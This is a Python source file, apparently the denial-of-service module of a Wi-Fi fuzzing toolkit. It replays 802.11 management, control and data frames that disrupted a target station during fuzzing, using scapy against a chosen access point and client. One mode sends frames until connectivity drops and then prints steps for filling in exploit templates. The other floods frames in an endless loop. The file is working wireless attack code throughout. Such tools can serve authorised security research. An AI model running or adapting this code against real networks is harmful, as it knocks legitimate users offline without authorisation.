"""Mage"""
import os
import subprocess
import sys
import time

import scapy.all
from Connection_monitors.aliveness_checkCheck import AllvCheck
from Connection_monitors.DeauthMonitor import DeauthMon

import settings
from ascii_art import dos_attack
from fuzzer_init import att_interface, targeted_access_point, targeted_sta
from message_colors import bcolors


def nec_checks():
    """nec_checks"""
    aliveness_check = AllvCheck(targeted_sta, "attacking")
    aliveness_check.start()
    deauth_monitor = DeauthMon(targeted_access_point, targeted_sta, att_interface)
    deauth_monitor.start()


def denial_of_service_attack_init(file_list, mode, frames_dir):
    """denial_of_service_attack_init"""
    chosen_files_list = []
    frames_list = []
    subprocess.call(["clear"], shell=True)
    print(dos_attack)
    print("\n" + ("-" * 117) + "\n")
    if mode == 1:
        for file in file_list:
            if "aliveness_check" in file:
                chosen_files_list.append(file)
            elif "Deauth" in file:
                chosen_files_list.append(file)
    elif mode == 2:
        for file in file_list:
            if "till_disr" in file:
                chosen_files_list.append(file)
    else:
        print(bcolors.FAIL + "\nNo relevant files found :(" + bcolors.ENDC)
        sys.exit(0)

    for files in chosen_files_list:
        with open(f"{current_dir}{frames_dir}{files}", "r", encoding="latin1") as f:
            for line in f:
                if "frame = " in line:
                    temp = line.strip("frame = \nb'")
                    try:
                        frames_list.append(
                            temp.encode()
                            .decode("unicode_escape")
                            .encode("raw_unicode_escape")
                        )
                    except:
                        pass
    return frames_list


def print_exploit(frame, frame_type):
    """print_exploit"""
    if frame_type == 1:
        print(
            bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC
        )
        print(f"\n{frame[32:]}\n")
        print(
            "Copy the above seed to the exploit.py file and replace it with the field "
            + bcolors.OKBLUE
            + "{SEED}"
            + bcolors.ENDC
        )
        subtype = int(int.from_bytes(frame[8:9], "big") / 16)
        print(
            f"Replace {bcolors.OKBLUE}" + "{SUBTYPE} " f"{bcolors.ENDC} with {subtype}"
        )
        print("\nAlso do the replacements:")
        print(
            bcolors.OKBLUE
            + "{DESTINATION_MAC}"
            + bcolors.ENDC
            + " = targeted_access_point/targeted_sta, "
            + bcolors.OKBLUE
            + "{SOURCE_MAC}"
            + bcolors.ENDC
            + " = targeted_access_point/targeted_sta, "
            + bcolors.OKBLUE
            + "{AP_MAC}"
            + bcolors.ENDC
            + " = targeted_access_point"
        )
        print(
            "\nFinally, replace"
            + bcolors.OKBLUE
            + " {ATT_INTERFACE}"
            + bcolors.ENDC
            + " with your WNIC attacking interface"
        )
        print(
            f"\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}"
            f"sudo python3 exploit_mngmt.py{bcolors.ENDC}"
        )
        print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
        input(
            f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n"
        )
        subprocess.call(["clear"], shell=True)
    elif frame_type == 2:
        print(
            bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC
        )
        subtype = int(int.from_bytes(frame[8:9], "big") / 16)
        if subtype in {4, 5, 6}:
            print(f"\n{frame[19:]}\n")
        else:
            print(f"\n{frame[25:]}\n")
        print(
            "Copy the above seed to the exploit.py file and replace it with the field "
            + bcolors.OKBLUE
            + "{SEED}"
            + bcolors.ENDC
        )
        print(
            f"Replace {bcolors.OKBLUE}" + "{SUBTYPE} " f"{bcolors.ENDC} with {subtype}"
        )
        print(
            "Replace "
            + bcolors.OKBLUE
            + "{FCf} "
            + bcolors.ENDC
            + "with "
            + f'{int.from_bytes(frame[9:10], "big")}'
        )
        print("\nAlso do the replacements:")
        print(
            bcolors.OKBLUE
            + "{DESTINATION_MAC}"
            + bcolors.ENDC
            + " = targeted_access_point/targeted_sta, "
            + bcolors.OKBLUE
            + "{SOURCE_MAC}"
            + bcolors.ENDC
            + " = targeted_access_point/targeted_sta"
        )
        print(
            "\nFinally, replace"
            + bcolors.OKBLUE
            + " {ATT_INTERFACE}"
            + bcolors.ENDC
            + " with your WNIC attacking interface"
        )
        print(
            f"\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}"
            f"sudo python3 exploit_ctrl.py{bcolors.ENDC}"
        )
        print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
        input(
            f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n"
        )
        subprocess.call(["clear"], shell=True)
    elif frame_type == 3:
        print(
            bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC
        )
        subtype = int(int.from_bytes(frame[8:9], "big") / 16)
        if frame[32:38] == frame[18:24]:
            print(f"\n{frame[38:]}\n")
        else:
            print(f"\n{frame[32:]}\n")
        print(
            "Copy the above seed to the exploit.py file and replace it with the field "
            + bcolors.OKBLUE
            + "{SEED}"
            + bcolors.ENDC
        )
        print(
            "Replace "
            + bcolors.OKBLUE
            + "{SUBTYPE} "
            + bcolors.ENDC
            + f"with {subtype}"
        )
        print(
            "Replace "
            + bcolors.OKBLUE
            + "{FCf} "
            + bcolors.ENDC
            + "with "
            + f'{int.from_bytes(frame[9:10], "big")}'
        )
        print(
            "Replace"
            + bcolors.OKBLUE
            + "{SC} "
            + bcolors.ENDC
            + "with "
            + f'{int.from_bytes(frame[30:32], "big")}'
        )
        print("\nAlso do the replacements:")
        print(
            f"{bcolors.OKBLUE}"
            "{DESTINATION_MAC}"
            f"{bcolors.ENDC} = targeted_access_point/targeted_sta, {bcolors.OKBLUE}"
            "{SOURCE_MAC}"
            f"{bcolors.ENDC} = targeted_access_point/targeted_sta"
        )
        print(
            f"\nFinally, replace{bcolors.OKBLUE}"
            " {ATT_INTERFACE}"
            f"{bcolors.ENDC} with your WNIC attacking interface"
        )
        print(
            f"\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}"
            f"sudo python3 exploit_data.py{bcolors.ENDC}"
        )
        print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
        input(
            f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n"
        )
        subprocess.call(["clear"], shell=True)


def send_frames(frames_list, mode, frame_type):
    """send_frames"""
    counter = 0
    if mode == 1:
        try:
            num_of_frames = int(
                input("\nType the number of frames to transmit per seed: ")
            )
        except:
            print(f"\n{bcolors.FAIL}Only integer inputs accepted{bcolors.ENDC}")
            sys.exit(0)

        for frame in frames_list:
            print(f"Sending {num_of_frames} frames of the {counter + 1} seed..")
            for _ in range(0, num_of_frames):
                scapy.all.sendp(frame, count=16, iface=att_interface, verbose=0)
                if not settings.is_alive:
                    print_exploit(frame, frame_type)
                    time.sleep(10)
                    settings.is_alive = True
                    settings.conn_loss = False
                    break
                elif settings.conn_loss:
                    print_exploit(frame, frame_type)
                    time.sleep(10)
                    settings.is_alive = True
                    settings.conn_loss = False
                    break
            counter += 1
        print(
            f"\n{bcolors.FAIL}No more seeds found in the fuzzer's log files{bcolors.ENDC}"
        )
        print("Exiting attack!!")
        sys.exit(0)
    elif mode == 2:
        print("\n- - - - - - - - - - - - - - - - - - - - - - - \n")
        print(f"{bcolors.OKGREEN}Launching the attack....{bcolors.ENDC}")
        print(f"{bcolors.OKGREEN}Stop the attack with Ctrl+C{bcolors.ENDC}")
        print("\n- - - - - - - - - - - - - - - - - - - - - - - \n")
        while True:
            for frame in frames_list:
                scapy.all.sendp(frame, count=128, iface=att_interface, verbose=0)
    else:
        print(f"{bcolors.FAIL}\nNo such choice :({bcolors.ENDC}")
        sys.exit(0)


print(dos_attack)
print(
    "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n"
)
print(
    "\t\tThis module launches a DoS attack based on the data (log files) collected from the fuzzing process.\n"
    "\t\tIt can only be performed against the same AP and STA used during the fuzzing process.\n"
    "\t\tNamely, the frames that caused any kind of problematic behavior during the fuzzing are being\n"
    "\t\ttransmitted in a way decided by the below options.\n\n"
)
print(("- " * 62) + "\n\n")
print("1) Frames detected at the moment of STA connectivity disruption, one-by-one")
print(
    "2) Sequence of frames till the moment a disruption was detected "
    f"{bcolors.WARNING}(BETA){bcolors.ENDC}"
)
try:
    choice = int(input("\nSelect the type of frames you wish to attack with: "))
except:
    print(f"\n{bcolors.FAIL}Only integer inputs accepted{bcolors.ENDC}")
    sys.exit(0)

subprocess.call(["clear"], shell=True)
print(dos_attack)
print(
    "\n---------------------------------------------------------------------------------------------------------------------\n"
)
print("1) Management Frames")
print("2) Control Frames")
print(f"3) Data Frames {bcolors.WARNING}(BETA){bcolors.ENDC}")
try:
    choice1 = int(input("Select the type of the frames: "))
except:
    print(f"\n{bcolors.FAIL}Only integer inputs accepted{bcolors.ENDC}")
    sys.exit(0)

current_dir = os.getcwd()
if choice1 == 1:
    file_list = os.listdir(current_dir + "/Logs/fuzz_mngmt_frames")
    frames_dir = "/Logs/fuzz_mngmt_frames/"
elif choice1 == 2:
    file_list = os.listdir(current_dir + "/Logs/fuzz_ctrl_frames")
    frames_dir = "/Logs/fuzz_ctrl_frames/"
elif choice1 == 3:
    file_list = os.listdir(current_dir + "/Logs/fuzz_data_frames")
    frames_dir = "/Logs/fuzz_data_frames/"
else:
    print(f"{bcolors.FAIL}\nNo such choice :({bcolors.ENDC}")
    sys.exit(0)

init_att = denial_of_service_attack_init(file_list, choice, frames_dir)
nec_checks()
time.sleep(20)

subprocess.call(["clear"], shell=True)
send_frames(init_att, choice, choice1)
